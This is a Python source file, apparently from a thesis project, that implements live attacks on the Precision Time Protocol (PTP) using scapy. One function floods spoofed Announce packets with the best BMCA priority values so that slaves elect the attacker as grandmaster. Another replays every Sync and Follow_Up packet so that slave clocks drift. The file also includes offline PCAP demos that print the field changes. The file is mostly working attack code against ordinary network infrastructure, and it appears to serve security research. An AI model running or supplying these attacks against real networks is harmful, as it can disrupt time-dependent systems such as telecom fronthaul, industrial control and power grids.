"""
PTP spoof and replay attack implementations.

Two live attacks (run on the Pi against the real FH network):
  spoof_attack()  — win BMCA by flooding spoofed Announce packets
  replay_attack() — duplicate every Sync/Follow_Up to corrupt slave timing

Two offline demos (read a captured PCAP, print what the attack would do):
  spoof_attack_demo(pcap_path)  — show before/after field manipulation
  replay_attack_demo(pcap_path) — list every packet that would be replayed

Usage:
  sudo python main.py spoof
  sudo python main.py replay
  python main.py spoof_demo [--pcap path/to/capture.pcap]
  python main.py replay_demo [--pcap path/to/capture.pcap]

Config is read from Thesis/.env (one directory above this file).
"""

import argparse
import os
import time

from dotenv import load_dotenv
from scapy.all import Ether, PcapReader, Raw, sendp, sniff  # type: ignore

# Load .env from Thesis/ (one level up from attacks/)
load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), "..", ".env"))

# IEEE 1588 EtherType carried in every PTP frame
PTP_ETHERTYPE = 0x88F7

# PTP message type values (low nibble of first payload byte)
MSG_ANNOUNCE = 0x0B
MSG_SYNC     = 0x00
MSG_FOLLOWUP = 0x08


# ── helpers ────────────────────────────────────────────────────────────────────

def _mac_to_clock_identity(mac: str, insert: bytes) -> bytes:
    """
    Derive an 8-byte PTP ClockIdentity from a 6-byte MAC by inserting
    2 bytes in the middle — matches the convention in Announce_Attack.py:
      insert=b'\xff\xff' for sourcePortIdentity.clockIdentity
      insert=b'\xff\xfe' for grandmasterIdentity
    """
    raw = bytes.fromhex(mac.replace(":", ""))
    half = len(raw) // 2           # 3
    return raw[:half] + insert + raw[half:]


def _get_iface_mac(iface: str) -> str:
    """Read the MAC address of a network interface from sysfs (Linux/Pi)."""
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()


def _is_ptp_type(pkt, msg_type: int) -> bool:
    """Return True if pkt is a PTP frame of the given message type."""
    return (
        Ether in pkt
        and pkt[Ether].type == PTP_ETHERTYPE
        and hasattr(pkt, "load")
        and len(pkt.load) > 0
        and (pkt.load[0] & 0x0F) == msg_type   # low nibble encodes message type
    )


# ── live attack 1: Announce spoof ─────────────────────────────────────────────

def spoof_attack() -> None:
    """
    Live BMCA subversion attack (run on the Pi).

    Waits for one real Announce from the legitimate grandmaster, then floods
    a modified copy with the attacker's identity and the best possible BMCA
    priority values. The PTP slave will switch its grandmaster to the attacker.
    """
    iface       = os.getenv("IFACE", "eth0")
    src_mac     = os.getenv("SPOOF_SRC_MAC") or _get_iface_mac(iface)
    priority1   = int(os.getenv("SPOOF_PRIORITY1", "0"))
    priority2   = int(os.getenv("SPOOF_PRIORITY2", "0"))
    clock_class = int(os.getenv("SPOOF_CLOCK_CLASS", "0"))
    duration    = int(os.getenv("SPOOF_DURATION", "60"))
    interval    = float(os.getenv("SPOOF_INTERVAL", "0.125"))

    # EUI-64 style identities derived from the attacker MAC
    clock_id  = _mac_to_clock_identity(src_mac, b"\xff\xff")  # for sourcePortIdentity
    master_id = _mac_to_clock_identity(src_mac, b"\xff\xfe")  # for grandmasterIdentity

    print(f"[spoof] Listening on {iface} for a real Announce packet ...")

    def _on_announce(pkt):
        if not _is_ptp_type(pkt, MSG_ANNOUNCE):
            return None  # keep sniffing

        payload = bytearray(pkt.load)

        # Overwrite source identity so BMCA attributes the clock to the attacker
        payload[20:28] = clock_id          # sourcePortIdentity.clockIdentity

        # Set grandmaster quality fields to the lowest (= best) possible values
        payload[47]    = priority1         # grandmasterPriority1
        payload[48]    = clock_class       # grandmasterClockQuality.clockClass
        payload[52]    = priority2         # grandmasterPriority2
        payload[53:61] = master_id         # grandmasterIdentity

        # Build the spoofed Ethernet frame with the attacker's source MAC
        spoofed = Ether(src=src_mac, dst=pkt[Ether].dst, type=PTP_ETHERTYPE) / Raw(load=bytes(payload))

        print(f"[spoof] Template captured. Flooding for {duration}s every {interval}s ...")
        deadline = time.time() + duration
        seq = int.from_bytes(payload[30:32], "big")

        while time.time() < deadline:
            seq = (seq + 1) & 0xFFFF              # wrap at 16-bit boundary
            payload[30:32] = seq.to_bytes(2, "big")  # increment sequenceId each send
            spoofed[Raw].load = bytes(payload)
            sendp(spoofed, iface=iface, verbose=False)
            time.sleep(interval)

        print("[spoof] Done.")
        return True  # non-None return stops sniff()

    # stop_filter fires _on_announce; sniff blocks until it returns truthy
    sniff(iface=iface, stop_filter=_on_announce)


# ── live attack 2: Sync + Follow_Up replay ────────────────────────────────────

def replay_attack() -> None:
    """
    Live replay attack (run on the Pi).

    Re-injects every Sync and Follow_Up packet seen on the interface.
    The slave receives each timing message twice per interval, corrupting
    its offset and delay calculations and causing gradual clock drift.
    """
    iface    = os.getenv("IFACE", "eth0")
    duration = int(os.getenv("REPLAY_DURATION", "30"))

    print(f"[replay] Re-injecting Sync + Follow_Up on {iface} for {duration}s ...")

    def _on_pkt(pkt):
        if not (Ether in pkt and pkt[Ether].type == PTP_ETHERTYPE):
            return
        if not (hasattr(pkt, "load") and pkt.load):
            return
        msg = pkt.load[0] & 0x0F                      # low nibble = message type
        if msg in (MSG_SYNC, MSG_FOLLOWUP):
            sendp(pkt, iface=iface, verbose=False)     # replay unmodified

    sniff(iface=iface, prn=_on_pkt, timeout=duration)
    print("[replay] Done.")


# ── demo 1: spoof field manipulation on a PCAP ────────────────────────────────

def spoof_attack_demo(pcap_path: str | None = None) -> None:
    """
    Offline demo of the spoof attack.

    Loads a PCAP, finds the first Announce packet, and prints a before/after
    comparison of every field that would be modified — no packets are sent.
    """
    pcap_path   = pcap_path or os.getenv("PCAP_PATH", "./ptp_server.pcap")
    src_mac     = os.getenv("SPOOF_SRC_MAC", "02:11:22:33:44:55")
    priority1   = int(os.getenv("SPOOF_PRIORITY1", "0"))
    priority2   = int(os.getenv("SPOOF_PRIORITY2", "0"))
    clock_class = int(os.getenv("SPOOF_CLOCK_CLASS", "0"))

    clock_id  = _mac_to_clock_identity(src_mac, b"\xff\xff")
    master_id = _mac_to_clock_identity(src_mac, b"\xff\xfe")

    print(f"[spoof_demo] Reading: {pcap_path}")

    # Find the first Announce packet in the capture
    template = None
    with PcapReader(pcap_path) as pcap:
        for pkt in pcap:
            if _is_ptp_type(pkt, MSG_ANNOUNCE):
                template = pkt
                break

    if template is None:
        print("[spoof_demo] No Announce packet found in the PCAP.")
        return

    orig    = bytes(template.load)
    payload = bytearray(orig)

    # ── before ────────────────────────────────────────────────────────────────
    print("\n--- Announce fields BEFORE spoofing ---")
    print(f"  Ether.src                        : {template[Ether].src}")
    print(f"  sourcePortIdentity.clockIdentity : {orig[20:28].hex(':')}")
    print(f"  grandmasterPriority1             : {orig[47]}")
    print(f"  grandmasterClockQuality.class    : {orig[48]}")
    print(f"  grandmasterPriority2             : {orig[52]}")
    print(f"  grandmasterIdentity              : {orig[53:61].hex(':')}")

    # Apply the same modifications as the live attack
    payload[20:28] = clock_id
    payload[47]    = priority1
    payload[48]    = clock_class
    payload[52]    = priority2
    payload[53:61] = master_id

    # ── after ─────────────────────────────────────────────────────────────────
    print("\n--- Announce fields AFTER spoofing ---")
    print(f"  Ether.src                        : {src_mac}  ← attacker MAC")
    print(f"  sourcePortIdentity.clockIdentity : {payload[20:28].hex(':')}  ← MAC + FF:FF insert")
    print(f"  grandmasterPriority1             : {payload[47]}  ← 0 = best in BMCA")
    print(f"  grandmasterClockQuality.class    : {payload[48]}  ← 0 = best in BMCA")
    print(f"  grandmasterPriority2             : {payload[52]}  ← 0 = best in BMCA")
    print(f"  grandmasterIdentity              : {payload[53:61].hex(':')}  ← MAC + FF:FE insert")

    print(
        "\nEffect: BMCA on every slave compares these fields in order. "
        "Priority1=0 and ClockClass=0 are lower than any legitimate grandmaster value, "
        "so the slave will elect the attacker as the new grandmaster and sync to its clock."
    )


# ── demo 2: replay packet listing on a PCAP ───────────────────────────────────

def replay_attack_demo(pcap_path: str | None = None) -> None:
    """
    Offline demo of the replay attack.

    Loads a PCAP and lists every Sync and Follow_Up packet that would be
    re-injected, showing the timing fields that the slave relies on.
    No packets are sent.
    """
    pcap_path = pcap_path or os.getenv("PCAP_PATH", "./captures/ptp_server.pcap")

    print(f"[replay_demo] Reading: {pcap_path}")

    rows = []
    with PcapReader(pcap_path) as pcap:
        for pkt in pcap:
            if not (Ether in pkt and pkt[Ether].type == PTP_ETHERTYPE):
                continue
            if not (hasattr(pkt, "load") and pkt.load):
                continue

            msg = pkt.load[0] & 0x0F               # low nibble = message type
            if msg not in (MSG_SYNC, MSG_FOLLOWUP):
                continue

            payload   = bytes(pkt.load)
            seq_id    = int.from_bytes(payload[30:32], "big")      # sequenceId field
            ts_sec    = int.from_bytes(payload[34:40], "big")      # originTimestamp seconds
            ts_nsec   = int.from_bytes(payload[40:44], "big")      # originTimestamp nanoseconds
            label     = "Sync" if msg == MSG_SYNC else "Follow_Up"
            rows.append((label, seq_id, ts_sec, ts_nsec, pkt[Ether].src))

    if not rows:
        print("[replay_demo] No Sync or Follow_Up packets found in the PCAP.")
        return

    # Print table
    print(f"\n{'Type':<12} {'SeqID':>6}  {'Timestamp (s)':<14} {'Timestamp (ns)':<14}  Source MAC")
    print("-" * 72)
    for label, seq, ts_s, ts_ns, mac in rows:
        print(f"{label:<12} {seq:>6}  {ts_s:<14} {ts_ns:<14}  {mac}")

    print(f"\nTotal packets that would be replayed: {len(rows)}")
    print(
        "\nEffect: the slave receives each Sync/Follow_Up twice within the same interval. "
        "Its path-delay and offset filters average over the duplicates, introducing a "
        "systematic error that accumulates into measurable clock drift over time."
    )


# ── entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PTP spoof and replay attack demos")
    parser.add_argument(
        "mode",
        choices=["spoof", "replay", "spoof_demo", "replay_demo"],
        help="Attack mode: 'spoof'/'replay' are live (need root + Pi NIC); "
             "'spoof_demo'/'replay_demo' are offline PCAP analysis",
    )
    parser.add_argument(
        "--pcap",
        default=None,
        help="Path to PCAP file for demo modes (overrides PCAP_PATH in .env)",
    )
    args = parser.parse_args()

    if args.mode == "spoof":
        spoof_attack()
    elif args.mode == "replay":
        replay_attack()
    elif args.mode == "spoof_demo":
        spoof_attack_demo(args.pcap)
    elif args.mode == "replay_demo":
        replay_attack_demo(args.pcap)
